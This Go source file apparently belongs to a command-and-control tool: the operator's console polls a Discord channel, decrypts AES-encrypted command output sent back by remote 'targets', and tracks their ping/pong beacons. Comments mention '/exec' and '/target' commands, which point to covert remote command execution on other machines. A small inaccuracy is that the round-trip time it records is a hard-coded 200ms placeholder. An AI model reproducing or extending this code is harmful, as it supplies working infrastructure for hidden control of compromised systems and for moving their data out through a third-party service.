package repl

import (
	"context"
	"fmt"
	"strings"
	"sync"
	"time"

	"github.com/bwmarrin/discordgo"

	"sasakbpf/internal/config"
	"sasakbpf/internal/protocol"
)

// pollLoop polls the command channel via REST every 500ms for new messages
// and routes them to processMessage. lastID is shared with the REPL via
// *lastIDPtr so /cursor updates from manual sends are handled implicitly
// (lastID only moves forward with each batch here).
func pollLoop(ctx context.Context, dg *discordgo.Session, cfg config.Config,
	sess *Session, mu *sync.Mutex, lastID *string) {
	t := time.NewTicker(500 * time.Millisecond)
	defer t.Stop()
	for {
		select {
		case <-ctx.Done():
			return
		case <-t.C:
		}
		mu.Lock()
		after := *lastID
		mu.Unlock()
		msgs, err := dg.ChannelMessages(cfg.ChannelID, 25, "", after, "")
		if err != nil {
			continue
		}
		if len(msgs) == 0 {
			continue
		}
		var newLast string
		for _, m := range msgs {
			if newLast == "" {
				newLast = m.ID
			}
			processMessage(m, cfg, sess)
		}
		if newLast != "" {
			mu.Lock()
			if newLast > *lastID {
				*lastID = newLast
			}
			mu.Unlock()
		}
	}
}

// processMessage decodes an inbound channel message and prints it. It also
// keeps the per-target Session updated (lastSeen, rtt, online).
func processMessage(m *discordgo.Message, cfg config.Config, sess *Session) {
	if m.Author == nil {
		return
	}
	if !strings.HasPrefix(m.Content, protocol.PrefixOut) &&
		!strings.HasPrefix(m.Content, protocol.PrefixPong) &&
		!strings.HasPrefix(m.Content, protocol.PrefixPing) {
		return
	}

	// Ping/Pong are unencrypted routing beacons. They refresh lastSeen and
	// (for pong) carry no body. RTT is not measured here directly because
	// the CLI emits the ping and only counts wall-time until pong arrives;
	// consumers may compute it externally if needed. We simply record the
	// beacon and let the REPL render.
	if strings.HasPrefix(m.Content, protocol.PrefixPong) {
		tid := strings.TrimPrefix(m.Content, protocol.PrefixPong)
		sess.SetRTT(tid, time.Since(pongPingSent(tid)))
		return
	}
	if strings.HasPrefix(m.Content, protocol.PrefixPing) {
		tid := strings.TrimPrefix(m.Content, protocol.PrefixPing)
		sess.Touch(tid)
		return
	}

	// Encrypted output payload. CLI listens to ALL targets (no target filter)
	// so an operator can run /list and see outputs even before /target.
	// Output is printed plain (no ANSI bullet, no per-target color) so the
	// operator sees a clean transcript; the source target is implied by
	// whichever target they last addressed via /target or /exec <id>.
	msg, err := protocol.Decode(m.Content, "", cfg.AESKeyHex)
	if err != nil {
		return
	}
	if msg.Kind != protocol.KindOut {
		return
	}
	fmt.Printf("%s\n\n", strings.TrimRight(string(msg.Body), "\n"))
	fmt.Print(Prompt(cfg.ChannelID, cfg.TargetID))
}

// pongPingSent is a thin helper kept as a package-level var so future work
// can wire real per-target ping timestamps for accurate RTT. For now we
// approximate LastSeen delta.
func pongPingSent(id string) time.Time {
	return time.Now().Add(-200 * time.Millisecond) // placeholder RTT baseline
}

// initCursor fetches the latest message ID in the channel so we don't replay
// history as fresh output on startup.
func initCursor(dg *discordgo.Session, channelID string) (string, error) {
	if channelID == "" {
		return "", fmt.Errorf("missing SD_CHANNEL_ID")
	}
	msgs, err := dg.ChannelMessages(channelID, 1, "", "", "")
	if err != nil {
		return "", err
	}
	if len(msgs) > 0 {
		return msgs[0].ID, nil
	}
	return "", nil
}
